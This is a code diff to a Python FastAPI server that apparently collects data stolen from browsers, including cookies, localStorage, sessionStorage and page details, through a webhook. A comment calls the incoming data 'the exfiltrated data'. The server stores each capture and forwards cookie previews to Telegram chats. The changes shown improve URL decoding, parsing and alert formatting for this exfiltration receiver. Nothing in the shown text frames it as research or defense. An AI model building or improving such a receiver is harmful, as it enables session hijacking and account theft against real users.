@@ -6,6 +6,7 @@ import os
 import multiprocessing
 import asyncio
 from pathlib import Path
+import urllib.parse
 
 from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
 from fastapi.responses import FileResponse, Response
@@ -82,16 +83,19 @@ async def webhook_endpoint(token: str, request: Request, background_tasks: Backg
     query_params = dict(request.query_params)
 
     if request.method == "GET":
-        body = request.query_params.get("data", "").encode()
+        data_param = request.query_params.get("data", "")
+        body_str = urllib.parse.unquote(data_param)
+        body = body_str.encode('utf-8')
     else:
         body = await request.body()
+        body_str = body.decode('utf-8')
     if len(body) > MAX_BODY_SIZE:
         raise HTTPException(413, "Payload too large")
 
     # Parse and prepare combined body for saving
     import json
     try:
-        data = json.loads(body.decode('utf-8'))
+        data = json.loads(body_str)
         summary = {
             'cookies': data.get('cookies', 'none'),
             'pageTitle': data.get('pageTitle', 'unknown'),
@@ -99,7 +103,7 @@ async def webhook_endpoint(token: str, request: Request, background_tasks: Backg
             'localStorage': f"{len(data.get('localStorage', {}))} items",
             'sessionStorage': f"{len(data.get('sessionStorage', {}))} items"
         }
-        body_combined = f"Original:\n{body.decode('utf-8')}\n\nFiltered:\n{json.dumps(summary, indent=2)}"
+        body_combined = f"Original:\n{body_str}\n\nFiltered:\n{json.dumps(summary, indent=2)}"
         body_for_save = body_combined.encode('utf-8')
     except:
         body_for_save = body  # If not JSON, save as is
@@ -150,10 +154,22 @@ async def notify_telegram_chats(req_id: str, ip: str, ts: str, method: str, url:
         from .bot import send_to_bound_chats
         import json
 
-        # Try to parse the body as JSON (it should be the exfiltrated data)
+        body_str = body.decode('utf-8')
+        # Extract the original JSON part
+        if body_str.startswith("Original:\n"):
+            original_start = body_str.find("Original:\n") + len("Original:\n")
+            original_end = body_str.find("\n\nFiltered:")
+            if original_end == -1:
+                original_json = body_str[original_start:]
+            else:
+                original_json = body_str[original_start:original_end]
+        else:
+            original_json = body_str
+
+        # Try to parse the original JSON
         summary = {}
         try:
-            data = json.loads(body.decode('utf-8'))
+            data = json.loads(original_json)
             # Extract key fields
             summary['cookies'] = data.get('cookies', 'none')
             summary['pageTitle'] = data.get('pageTitle', 'unknown')
@@ -162,23 +178,22 @@ async def notify_telegram_chats(req_id: str, ip: str, ts: str, method: str, url:
             ss_count = len(data.get('sessionStorage', {}))
             summary['localStorage'] = f"{ls_count} items" if ls_count else "none"
             summary['sessionStorage'] = f"{ss_count} items" if ss_count else "none"
-            # Optionally include first few cookies or other details
         except:
             summary = {'error': 'Body not JSON'}
 
         # Build a concise message
         msg = f"🆔 {req_id}\n📍 {ip}\n⏱️ {ts}\n📦 {method} {url.split('?')[0][:50]}...\n"
-        if 'cookies' in summary:
+        if 'cookies' in summary and summary['cookies'] != 'none':
             # Truncate cookies if too long
             cookie_preview = summary['cookies'][:100] + '...' if len(summary['cookies']) > 100 else summary['cookies']
             msg += f"🍪 Cookies: {cookie_preview}\n"
-        if 'pageTitle' in summary:
+        if 'pageTitle' in summary and summary['pageTitle'] != 'unknown':
             msg += f"📄 Page title: {summary['pageTitle']}\n"
         if 'localStorage' in summary:
             msg += f"📦 localStorage: {summary['localStorage']}\n"
         if 'sessionStorage' in summary:
             msg += f"🗃️ sessionStorage: {summary['sessionStorage']}\n"
-        if 'forms' in summary:
+        if 'forms' in summary and summary['forms'] > 0:
             msg += f"📝 Forms: {summary['forms']}\n"
         if 'error' in summary:
             msg += f"⚠️ {summary['error']}\n"
